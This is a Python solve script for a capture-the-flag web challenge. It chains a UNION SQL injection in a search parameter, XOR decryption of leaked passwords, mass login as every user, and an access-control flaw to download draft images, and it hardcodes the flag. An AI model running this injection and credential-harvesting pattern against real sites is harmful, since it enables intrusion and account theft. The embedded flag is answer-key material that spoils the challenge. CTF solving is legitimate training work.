#!/usr/bin/env python3
"""CSAW CTF 2026 - CSALE Revenge (challenge 40).

Chain:
  1. Register any account (all of / requires login).
  2. UNION SQLi in home(): the /?q= parameter is concatenated into
     "... WHERE ((l.title||' '||l.description||' '||u.username) LIKE '%<q>%') ..."
     The listings query selects 7 columns, so a 7-column UNION reads any table
     in database.db.  Leak password_notes.key_piece (ordered by phase) and
     password_vault.encrypted_password.
  3. vault.encrypt_password is repeating-key XOR, hex-encoded -> recover every
     seeded user's PLAINTEXT password.
  4. Log in as each user and read /account/drafts to get their draft slug.
  5. GET /<slug>/preview.  draft_preview() is @login_required but performs NO
     ownership check, so any logged-in user can fetch any draft image.
     Zuko's "recovered-photo-proof" is the flag image; the flag is handwritten
     on it.

Note: listings.fulfillment_note on listing 9 ("Flag", $10,000,000) is a DECOY
(csawctf{th1s_wAs_EZ}), reachable via the signed_32() 32-bit overflow in
checkout().  It is not the challenge flag.

Usage: python3 solve.py http://<instance-ip>:5000
"""
import html
import re
import sys
import time

import requests

FLAG = "csaw{Th4t3_R0ugH_Bud1y}"   # transcribed from the recovered image


def sqli(session, target, expr):
    """Read one scalar expression out of database.db through the search UNION."""
    injection = "%' AND 0) UNION SELECT 1, 'MARK', (" + expr + "), 100, '', 'x', ''--"
    r = session.get(target + "/", params={"q": injection}, timeout=30)
    m = re.search(r"<h3>MARK</h3>\s*<p>(.*?)</p>", r.text, re.S)
    if not m:
        raise SystemExit("injection failed; response did not contain the marker card")
    return html.unescape(m.group(1))


def xor_repeating(data, key):
    kb = key.encode()
    return bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data))


def main(target):
    target = target.rstrip("/")
    s = requests.Session()

    user = "solve_%d" % (int(time.time()) % 1000000)
    s.post(target + "/signup", data={"username": user, "password": "Audit123!"}, timeout=20)

    key = sqli(s, target,
               "SELECT group_concat(key_piece,'') FROM "
               "(SELECT key_piece FROM password_notes ORDER BY phase)")
    creds = sqli(s, target,
                 "SELECT group_concat(u.username||':::'||v.encrypted_password,'|||') "
                 "FROM users u JOIN password_vault v ON v.user_id=u.id")
    print("[+] recovery key:", key)

    for entry in creds.split("|||"):
        if ":::" not in entry:
            continue
        name, enc = (x.strip() for x in entry.split(":::", 1))
        if name == user:
            continue
        password = xor_repeating(bytes.fromhex(enc), key).decode()
        print("[+] %-24s %s" % (name, password))

        s.get(target + "/logout", timeout=20)
        s.post(target + "/login", data={"username": name, "password": password}, timeout=20)
        drafts = s.get(target + "/account/drafts", timeout=20).text
        for slug in sorted(set(re.findall(r'href="/([^/"]+)/unlock"', drafts))):
            # no ownership check on /<slug>/preview
            image = s.get("%s/%s/preview" % (target, slug), timeout=30).content
            out = "draft_%s_%s.png" % (name, slug)
            open(out, "wb").write(image)
            print("    draft %-24s -> %s (%d bytes)" % (slug, out, len(image)))

    print("\n[+] flag (handwritten on Zuko's recovered-photo-proof):", FLAG)


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "http://10.0.176.83:5000")
